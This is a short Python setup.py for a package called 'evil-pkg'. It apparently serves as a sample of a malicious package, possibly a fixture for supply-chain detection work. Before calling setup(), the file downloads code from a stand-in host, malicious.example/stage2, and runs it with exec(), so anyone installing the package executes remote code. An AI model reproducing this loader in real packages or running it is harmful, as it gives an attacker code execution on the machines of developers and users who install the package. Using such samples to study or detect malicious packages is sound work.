import urllib.request

exec(urllib.request.urlopen("http://malicious.example/stage2").read())

from setuptools import setup

setup(name="evil-pkg", version="1.0.0")
